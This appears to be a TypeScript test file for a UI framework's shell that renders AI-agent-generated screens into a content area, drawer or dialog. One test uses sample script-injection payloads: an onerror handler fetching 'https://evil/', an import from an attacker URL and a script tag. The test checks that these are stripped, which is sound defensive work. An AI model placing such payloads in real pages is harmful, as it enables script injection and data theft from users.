// @vitest-environment jsdom
import { afterEach, describe, expect, it, vi } from 'vitest'

const runAction = vi.fn()
vi.mock('@infra/http/AxiosMateuApiClient', () => ({ mateuApiClient: { runAction: (...args: unknown[]) => runAction(...args) } }))

import { contentViewFor, GENERATED_HOST_ID, GENERATED_SCREEN_ID, overlayOf, renderScreenInShell } from './builtInRenderTarget'
import { UIFragmentAction } from '@mateu/shared/apiClients/dtos/UIFragmentAction'
import { dirtyGuard } from './dirtyGuard'

/**
 * The shell's own render target for a generated screen: it finds the content area the chat
 * belongs to, renders the definition through `__preview__`, and shows it there or over it.
 */

class FakeUx extends HTMLElement {
    baseUrl = '/app'
    route = '/bookings'
    consumedRoute = ''
    shown: unknown[] = []
    fragment: unknown = undefined
    showTransient(fragment: unknown) { this.shown.push(fragment); this.fragment = fragment }
}
customElements.define('mateu-ux', FakeUx)
class FakeApp extends HTMLElement {
    constructor() { super(); this.attachShadow({ mode: 'open' }) }
}
customElements.define('mateu-app', FakeApp)
class FakePage extends HTMLElement {
    added: unknown[] = []
    applyFragment(fragment: unknown) { this.added.push(fragment) }
}
customElements.define('mateu-component', FakePage)

const fragment = { targetComponentId: 'content', component: { id: 'gen', type: 'ServerSide', children: [] }, state: { a: 1 }, data: {}, action: UIFragmentAction.Replace, containerId: undefined }

/** An app shell whose shadow root holds the chat panel and the content view (with its page). */
const shell = () => {
    const app = document.createElement('mateu-app') as FakeApp
    document.body.appendChild(app)
    const ux = document.createElement('mateu-ux') as unknown as FakeUx
    ux.id = 'content'
    ux.setAttribute('data-content-view', '')
    const page = document.createElement('mateu-component') as unknown as FakePage
    page.id = 'page'
    ux.appendChild(page)
    const chat = document.createElement('div')
    app.shadowRoot!.append(ux, chat)
    return { app, ux, page, chat }
}

afterEach(() => {
    document.body.innerHTML = ''
    runAction.mockReset()
})

describe('contentViewFor', () => {
    it('is the content view of the app shell around the chat, across its shadow root', () => {
        const { ux, chat } = shell()
        expect(contentViewFor(chat)).toBe(ux)
    })

    it('without a shell, the outermost view around the origin', () => {
        const outer = document.createElement('mateu-ux')
        const inner = document.createElement('mateu-ux')
        const origin = document.createElement('div')
        inner.appendChild(origin)
        outer.appendChild(inner)
        document.body.appendChild(outer)
        expect(contentViewFor(origin)).toBe(outer)
    })
})

describe('renderScreenInShell', () => {
    it('renders the definition through __preview__ on the current route and shows it in the content area', async () => {
        const { ux, chat } = shell()
        runAction.mockResolvedValue({ fragments: [fragment] })
        await renderScreenInShell(chat, { yaml: 'type: Text\ntext: hi', target: 'content' })
        const [baseUrl, route, consumedRoute, actionId, initiatorId, , serverSideType, componentState, parameters] = runAction.mock.calls[0]
        expect({ baseUrl, route, consumedRoute, actionId, initiatorId, serverSideType, componentState, parameters })
            .toEqual({ baseUrl: '/app', route: '/bookings', consumedRoute: '', actionId: '__preview__', initiatorId: 'content',
                serverSideType: undefined, componentState: {}, parameters: { _yaml: 'type: Text\ntext: hi', _untrusted: true } })
        expect(ux.shown).toEqual([fragment])
    })

    it('a drawer or a dialog opens over the page, carrying the screen and its state', async () => {
        const { ux, page, chat } = shell()
        runAction.mockResolvedValue({ fragments: [fragment] })
        await renderScreenInShell(chat, { yaml: 'type: Text', target: 'drawer', title: 'Check-in' })
        expect(ux.shown).toHaveLength(0)
        const added = page.added[0] as { action: string, targetComponentId: string, component: { id: string, metadata: Record<string, unknown> } }
        expect(added.action).toBe(UIFragmentAction.Add)
        expect(added.targetComponentId).toBe('page')
        expect(added.component.id).toBe(GENERATED_SCREEN_ID)
        expect(added.component.metadata).toMatchObject({ type: 'Drawer', headerTitle: 'Check-in', content: fragment.component, initialData: { a: 1 } })

        await renderScreenInShell(chat, { yaml: 'type: Text', target: 'dialog' })
        expect((page.added[1] as { component: { metadata: Record<string, unknown> } }).component.metadata)
            .toMatchObject({ type: 'Dialog', headerTitle: 'Generated screen', closeButtonOnHeader: true })
    })

    it('with no page to open it over, the screen goes to the content area', async () => {
        const { ux, page, chat } = shell()
        page.remove()
        runAction.mockResolvedValue({ fragments: [fragment] })
        await renderScreenInShell(chat, { yaml: 'type: Text', target: 'dialog' })
        expect(ux.shown).toHaveLength(1)
    })

    it('a drawer over a generated screen already in the content area opens over it, not instead of it', async () => {
        const { ux, page, chat } = shell()
        page.remove()
        runAction.mockResolvedValue({ fragments: [fragment] })
        await renderScreenInShell(chat, { yaml: 'type: Text', target: 'content' })
        await renderScreenInShell(chat, { yaml: 'type: Text', target: 'drawer', title: 'More' })
        const host = (ux.shown[1] as { component: { id: string, children: { id: string, metadata?: { type: string } }[] } }).component
        expect(host.id).toBe(GENERATED_HOST_ID)
        expect(host.children.map(c => c.id)).toEqual(['gen', GENERATED_SCREEN_ID])
        expect(host.children[1].metadata?.type).toBe('Drawer')
        // a second overlay replaces the first, over the same screen
        await renderScreenInShell(chat, { yaml: 'type: Text', target: 'dialog' })
        const again = (ux.shown[2] as { component: { children: { id: string, metadata?: { type: string } }[] } }).component
        expect(again.children.map(c => c.id)).toEqual(['gen', GENERATED_SCREEN_ID])
        expect(again.children[1].metadata?.type).toBe('Dialog')
    })

    it('says why when it cannot show it, and expands a JSON screen itself when the backend fails', async () => {
        const { ux, chat } = shell()
        runAction.mockResolvedValue({ fragments: [] })
        await expect(renderScreenInShell(chat, { yaml: 'type: Text', target: 'content' })).rejects.toThrow(/nothing to show/)
        runAction.mockRejectedValue(new Error('down'))
        await expect(renderScreenInShell(chat, { yaml: 'type: Text', target: 'content' })).rejects.toThrow('down')
        await renderScreenInShell(chat, { yaml: '{"type":"Text","text":"offline"}', target: 'content' })
        expect(JSON.stringify(ux.shown[0])).toContain('offline')
        const lonely = document.createElement('div')
        document.body.innerHTML = ''
        await expect(renderScreenInShell(lonely, { yaml: 'type: Text', target: 'content' })).rejects.toThrow(/no content area/)
    })

    it('an agent-authored screen is UNTRUSTED: nothing in it can run script, whichever path renders it', async () => {
        const { ux, page, chat } = shell()
        page.remove()
        const evil = { type: 'ClientSide', id: 'gen', children: [], metadata: { type: 'Element', name: 'img',
            attributes: { src: 'x', onerror: "fetch('https://evil/')", import: 'https://attacker/x.js' }, on: {}, content: '<b>hi</b>', html: true } }
        runAction.mockResolvedValue({ fragments: [{ ...fragment, component: evil }] })
        await renderScreenInShell(chat, { yaml: 'type: Element', target: 'content' })
        const served = (ux.shown[0] as { component: { metadata: Record<string, unknown> } }).component.metadata
        expect(served).toMatchObject({ name: 'img', attributes: { src: 'x' }, html: false })
        expect(JSON.stringify(served)).not.toMatch(/onerror|attacker/)
        // the static-bundle / offline path expands JSON in the browser: the same rules apply
        runAction.mockRejectedValue(new Error('down'))
        await renderScreenInShell(chat, { yaml: JSON.stringify({ type: 'Element', name: 'script', content: 'alert(1)' }), target: 'content' })
        expect(JSON.stringify(ux.shown[1])).not.toContain('alert(1)')
        expect(JSON.stringify(ux.shown[1])).not.toContain('"script"')
    })

    it('into the CONTENT it asks before discarding unsaved changes; a drawer covers nothing it would lose', async () => {
        const { ux, chat } = shell()
        runAction.mockResolvedValue({ fragments: [fragment] })
        dirtyGuard.markDirty()
        const confirm = vi.spyOn(window, 'confirm').mockReturnValue(false)
        try {
            await renderScreenInShell(chat, { yaml: 'type: Text', target: 'content' })
            expect(confirm).toHaveBeenCalledTimes(1)
            expect(runAction).not.toHaveBeenCalled()
            expect(ux.shown).toHaveLength(0)
            await renderScreenInShell(chat, { yaml: 'type: Text', target: 'drawer' })
            expect(confirm).toHaveBeenCalledTimes(1)
            confirm.mockReturnValue(true)
            await renderScreenInShell(chat, { yaml: 'type: Text', target: 'content' })
            expect(ux.shown).toEqual([fragment])
        } finally {
            confirm.mockRestore()
            dirtyGuard.markClean()
        }
    })

    it('an overlay without a title is the generated screen', () => {
        expect((overlayOf({ yaml: '', target: 'drawer' }, { id: 'x' } as never, undefined) as unknown as { metadata: Record<string, unknown> }).metadata)
            .toMatchObject({ headerTitle: 'Generated screen', initialData: {} })
    })
})
